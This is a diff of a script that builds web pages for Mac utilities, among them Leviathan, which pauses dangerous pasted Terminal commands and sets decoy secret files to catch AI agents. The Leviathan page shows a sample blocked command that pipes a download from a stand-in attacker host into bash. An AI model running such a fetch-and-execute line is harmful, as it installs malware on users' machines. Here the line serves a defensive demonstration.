@@ -19,7 +19,7 @@ cat > leviathan/index.html <<EOF
 $H<title>Leviathan</title><meta name="description" content="Leviathan protects a Mac from malware sites, harmful downloads and dangerous pasted commands."></head><body>$TOP
 <nav class="crumb"><a class="back" href="/"><span aria-hidden="true">&larr;</span> All projects</a></nav>
 <section class="p-hero split glass"><div><div class="label"><i class="dot" style="background:var(--sea)"></i>Project 01 &middot; macOS &middot; v2.0</div><h1 class="serif" style="margin-top:16px">Leviathan</h1><p class="lede serif">It stops malware on your Mac before the malware can run.</p>
-<div class="actions"><a class="btn" href="https://github.com/Questboy23/leviathan/releases/latest/download/Leviathan.zip">Download for Mac <span aria-hidden="true">&darr;</span></a><a class="link" href="https://github.com/Questboy23/leviathan">View the code</a></div><p class="note">Open the zip, then right-click <b>Install Leviathan.command</b> and choose Open. It needs <a href="https://brew.sh">Homebrew</a> and your Mac password. The shield appears in your menu bar.</p></div>
+<div class="actions"><a class="btn" href="https://github.com/Questboy23/leviathan/releases/latest/download/Leviathan.zip">Download for Mac <span aria-hidden="true">&darr;</span></a><a class="link" href="https://github.com/Questboy23/leviathan">View the code</a></div><p class="note">Double-click the zip in Downloads, then double-click <b>Install Leviathan.command</b>. The first time, macOS blocks it because it is not from the App Store: open System Settings, Privacy &amp; Security, scroll down, click <b>Open Anyway</b>, then double-click it again. It needs <a href="https://brew.sh">Homebrew</a> and your Mac password. The shield appears in your menu bar.</p></div>
 <figure class="win" aria-label="Example of the paste guard"><div class="bar"><i></i><i></i><i></i><span>Terminal</span></div><pre class="scr"><span class="dim">$</span> curl -s evil.example/fix | bash
 <b>Leviathan stopped this command.</b>
 It downloads a program and runs it
@@ -34,6 +34,8 @@ straight away. Scam pages ask for this.
 <h4>3. Sneaky startup items get switched off</h4><p>Some malware hides by adding itself to the list of programs that start when you log in, often pretending to be part of macOS. Leviathan looks for those disguises and turns them off.</p>
 <h4>4. Dangerous pasted commands get paused</h4><p>A popular scam shows a fake error and asks you to paste a line into Terminal to &ldquo;fix&rdquo; it. That line installs malware. Leviathan recognises these commands, stops them once and explains the risk. If you really meant it, pressing Enter again runs it.</p>
 <h4>5. A shield in your menu bar</h4><p>A small shield sits next to Wi-Fi and the battery. Pick a protection level from 1 to 5, and flip a switch when you are doing something risky: handling crypto, opening an app from an unknown source, using Tor, or running AI agents. Each switch turns on the guards that fit, such as warning you when a copied wallet address gets swapped, opening an untrusted app in a sealed sandbox, or pausing every AI agent with one click.</p></div></section>
+<h4>6. It watches AI agents</h4><p>With the AI agents switch on, Leviathan checks every 5 minutes what AI coding tools such as Claude Code and Codex are doing. It plants fake secret files; if an agent reads one, a warning window opens and the read is logged. One click pauses every AI agent at once. It also warns when an AI tool is set to act without asking you.</p>
+<h4>7. White when idle, green while working</h4><p>The shield is white while Leviathan waits. It turns green while a scan or check runs, and orange when it has a warning you have not seen.</p>
 
 <section class="blk glass"><h3 class="serif">Why it&rsquo;s useful</h3><ul class="pros">
 <li><span class="k">01</span><div><b>Covers the tricks antivirus misses</b><span>Fake sites and pasted commands are how most Mac malware spreads today.</span></div></li>
@@ -43,10 +45,10 @@ straight away. Scam pages ask for this.
 </ul></section>
 
 <section class="blk glass"><h3 class="serif">How to install</h3><div><ol class="steps">
-<li><span class="k">1</span><div><b>Download</b><span>Click Download for Mac above. Your Mac unzips it into Downloads.</span></div></li>
+<li><span class="k">1</span><div><b>Download</b><span>Click Download for Mac above, then double-click the zip in your Downloads folder to unzip it.</span></div></li>
 <li><span class="k">2</span><div><b>Open Terminal</b><span>Press Cmd and Space, type Terminal, press Return.</span></div></li>
 <li><span class="k">3</span><div><b>Run the installer</b><span>Type <code>bash </code> with a space, drag <code>install.sh</code> from the unzipped folder into the window, and press Return. Enter your Mac password when asked; the website filter needs it once.</span></div></li>
-</ol><p class="note">Or paste this single line into Terminal:</p><pre><code>cd ~ &amp;&amp; curl -fsSL https://github.com/Questboy23/leviathan/archive/refs/tags/v2.0.6.tar.gz | tar xz &amp;&amp; bash leviathan-2.0.6/install.sh</code></pre></div></section>
+</ol><p class="note">Or paste this single line into Terminal:</p><pre><code>cd ~ &amp;&amp; curl -fsSL https://github.com/Questboy23/leviathan/archive/refs/tags/v2.0.7.tar.gz | tar xz &amp;&amp; bash leviathan-2.0.7/install.sh</code></pre></div></section>
 $FOOT
 EOF
 
@@ -54,7 +56,7 @@ cat > activity-monitored/index.html <<EOF
 $H<title>Activity Monitored</title><meta name="description" content="Activity Monitored keeps a Mac responsive when it is overloaded."></head><body>$TOP
 <nav class="crumb"><a class="back" href="/"><span aria-hidden="true">&larr;</span> All projects</a></nav>
 <section class="p-hero split glass"><div><div class="label"><i class="dot" style="background:var(--mustard)"></i>Project 02 &middot; macOS</div><h1 class="serif" style="margin-top:16px">Activity Monitored</h1><p class="lede serif">Keeps your Mac quick when too much is running at once.</p>
-<div class="actions"><a class="btn" href="https://github.com/Questboy23/activity-monitored/releases/latest/download/Activity-Monitored.zip">Download for Mac <span aria-hidden="true">&darr;</span></a><a class="link" href="https://github.com/Questboy23/activity-monitored">View the code</a></div><p class="note">Open the zip, then right-click <b>Install Activity Monitored.command</b> and choose Open. It runs in the background from then on; type <code>monitored</code> in Terminal to see what it did.</p></div>
+<div class="actions"><a class="btn" href="https://github.com/Questboy23/activity-monitored/releases/latest/download/Activity-Monitored.zip">Download for Mac <span aria-hidden="true">&darr;</span></a><a class="link" href="https://github.com/Questboy23/activity-monitored">View the code</a></div><p class="note">Double-click the zip in Downloads, then double-click <b>Install Activity Monitored.command</b>. The first time, macOS blocks it because it is not from the App Store: open System Settings, Privacy &amp; Security, scroll down, click <b>Open Anyway</b>, then double-click it again. It runs in the background from then on; type <code>monitored</code> in Terminal to see what it did.</p></div>
 <figure class="win" aria-label="Example of Activity Monitored at work"><div class="bar"><i></i><i></i><i></i><span>Activity Monitored</span></div><pre class="scr">Processor  <span class="meter"><i style="width:96%"></i></span> 96%
 <b>Busy. Asking 3 background programs to wait.</b>
   backup        lowered
@@ -66,19 +68,19 @@ $H<title>Activity Monitored</title><meta name="description" content="Activity Mo
 
 <section class="blk glass"><h3 class="serif">How it works</h3><div class="prose feats">
 <h4>1. It watches the load</h4><p>Every 3 seconds it checks how hard the processor is working and which programs are using it most. If there is spare room, it does nothing at all.</p>
-<h4>2. It lowers busy background programs</h4><p>When the Mac is overloaded, it moves the heaviest background programs to macOS&rsquo;s low priority lane, the same one macOS uses for its own background chores. Nothing is closed or paused, and no work is lost.</p>
+<h4>2. It lowers busy background programs</h4><p>When the Mac is overloaded, it moves the heaviest background programs to macOS&rsquo;s low priority lane, the same one macOS uses for its own background chores. Nothing is paused and no work is lost. The only program it ever closes is a browser tab using over 3 GB when memory has run out completely; the tab reloads.</p>
 <h4>3. It always puts things back</h4><p>Every change starts its own 90 second timer that reverses it automatically. The timer runs separately, so even if Activity Monitored crashes or you remove it, your programs still return to normal. Every change is also written to a log you can read.</p>
 <h4>4. It warns you about what it cannot fix</h4><p>A nearly full disk or exhausted memory can freeze every app, and lowering priority does not help. When free disk space drops below 20 GB, memory stays full, or one program keeps hogging the processor, it shows a Mac notification naming the cause, at most once every 30 minutes. It never closes anything for you.</p></div></section>
 
 <section class="blk glass"><h3 class="serif">Why it&rsquo;s useful</h3><ul class="pros">
 <li><span class="k">01</span><div><b>The app you&rsquo;re using stays smooth</b><span>Typing, scrolling and video keep up even while heavy work runs behind them.</span></div></li>
 <li><span class="k">02</span><div><b>Heavy jobs can even finish sooner</b><span>In one overload test on one Mac, a 10 program job finished in 24 seconds instead of 39.</span></div></li>
-<li><span class="k">03</span><div><b>Nothing is ever closed</b><span>Programs are only slowed for a moment. They keep running and keep their work.</span></div></li>
+<li><span class="k">03</span><div><b>Programs keep running</b><span>Programs are only slowed for a moment and keep their work. The one exception is a runaway browser tab over 3 GB when memory is completely full.</span></div></li>
 <li><span class="k">04</span><div><b>Free, private, no account</b><span>No subscription, no sign up, and no data leaves your Mac.</span></div></li>
 </ul></section>
 
 <section class="blk glass"><h3 class="serif">How to install</h3><div><ol class="steps">
-<li><span class="k">1</span><div><b>Download</b><span>Click Download for Mac above. Your Mac unzips it into Downloads.</span></div></li>
+<li><span class="k">1</span><div><b>Download</b><span>Click Download for Mac above, then double-click the zip in your Downloads folder to unzip it.</span></div></li>
 <li><span class="k">2</span><div><b>Open the installer</b><span>In the unzipped folder, right click <code>Install Activity Monitored.command</code> and choose Open.</span></div></li>
 <li><span class="k">3</span><div><b>That&rsquo;s it</b><span>It starts now and every time you log in. If your Mac offers to install developer tools, click Install, then repeat step 2.</span></div></li>
 </ol><p class="note">Or paste this single line into Terminal:</p><pre><code>curl -fsSL https://raw.githubusercontent.com/Questboy23/activity-monitored/main/install.sh | bash</code></pre></div></section>
@@ -145,7 +147,7 @@ vca revoke    # cancel the grant at any time</code></pre>
 <li><span class="k">4</span><div><b>Run it</b><span><code>vca run --provider claude --mode auto --goal "get me to my Chrome extensions"</code></span></div></li></ol></div></section>
 
 <section class="blk glass"><h3 class="serif">How to install</h3><div><ol class="steps">
-<li><span class="k">1</span><div><b>Download and unzip</b><span>Click Download for Mac above. Your Mac unzips it into Downloads.</span></div></li>
+<li><span class="k">1</span><div><b>Download and unzip</b><span>Click Download for Mac above, then double-click the zip in your Downloads folder to unzip it.</span></div></li>
 <li><span class="k">2</span><div><b>Get the tools</b><span>Install Homebrew from brew.sh, then run <code>brew install uv cmake</code> in Terminal.</span></div></li>
 <li><span class="k">3</span><div><b>Run the installer</b><span>Type <code>bash </code> with a space, drag <code>install.sh</code> from the unzipped folder into Terminal, and press Return. It adds the menu bar ring and starts it at login.</span></div></li>
 <li><span class="k">4</span><div><b>Allow permissions</b><span>System Settings, Privacy &amp; Security: turn on Accessibility and Screen Recording for Voice Computer Agent. Under Menu Bar, allow it so the ring shows.</span></div></li>
